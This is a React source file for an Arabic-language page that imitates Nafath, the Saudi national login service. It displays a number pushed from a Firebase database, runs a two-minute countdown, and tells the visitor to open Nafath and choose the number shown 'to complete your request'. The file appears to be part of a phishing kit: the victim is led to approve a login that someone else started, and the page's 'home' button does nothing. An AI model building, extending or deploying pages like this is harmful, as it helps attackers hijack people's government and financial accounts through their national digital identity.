import { useEffect, useState } from 'react';
import './App.css';
import Countdown from 'react-countdown';
import { app } from '../src/firebase';
import { child, get, getDatabase, onValue, ref } from 'firebase/database';

const CountDown = () => {
  const Completionist = () => <span>تحديث</span>;
  return (
    <Countdown date={Date.now() + 120000}>
      <Completionist />
    </Countdown>
  );

  // Random component
};
function App() {
  const [code, setCode] = useState(0);
  const db = getDatabase(app);
  const starCountRef = ref(db, 'userId');
  const getCode = () => {
    return code;
  };
  useEffect(() => {
    onValue(starCountRef, (snapshot: any) => {
      setCode(snapshot.val());
    });
  }, []);
  useEffect(() => {
    setTimeout(() => {
      get(child(starCountRef, `userId/`))
        .then((snapshot) => {
          if (snapshot.exists()) {
            setCode(snapshot.val());
          } else {
            console.log('No data available');
          }
        })
        .catch((error) => {
          console.error(error);
        });
    }, 2000);
  }, []);
  return (
    <>
      <div className="containar">
        <div className="loading">
          <div>
            <div
              style={{
                border: '5px #6E044E solid',
                borderRadius: '100%',
                width: '100%',
                height: '100%',
              }}
              className="containar"
            >
              <div style={{ margin: 60, paddingLeft: 14, paddingRight: 14 }}>
                <h3>{`${getCode()}`} </h3>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="containar p-2">
        <span>
          الرمز ينتهي بعد :
          {
            <span id="time" style={{ margin: 2 }}>
              <CountDown />
            </span>
          }
        </span>
      </div>
      <div className="containar p-2" style={{ textAlign: 'center' }}>
        <strong>ادخل الى نفاذ وأختر الرقم الذي يظهر أمامك لاكمال طلبك</strong>
      </div>

      <div className="containar p-2">
        <button
          onClick={() => {
            console.log('2sa');
          }}
        >
          {' '}
          العودة الى الرئيسية
        </button>
      </div>
      <div className="containar p-2">لتحميل تطبيق نفاذ</div>
      <div className="containar p-2">
        <img
          width={100}
          className="p-6"
          src="https://static.vecteezy.com/system/resources/thumbnails/024/170/871/small/badge-google-play-and-app-store-button-download-free-png.png"
          alt="st"
        />
        <img
          src="https://i.ibb.co/bgMGxD5/pngfind-com-apple-icon-png-369281-removebg-preview.png"
          className="p-6"
          alt="sa"
          width={100}
        />
      </div>
    </>
  );
}

export default App;
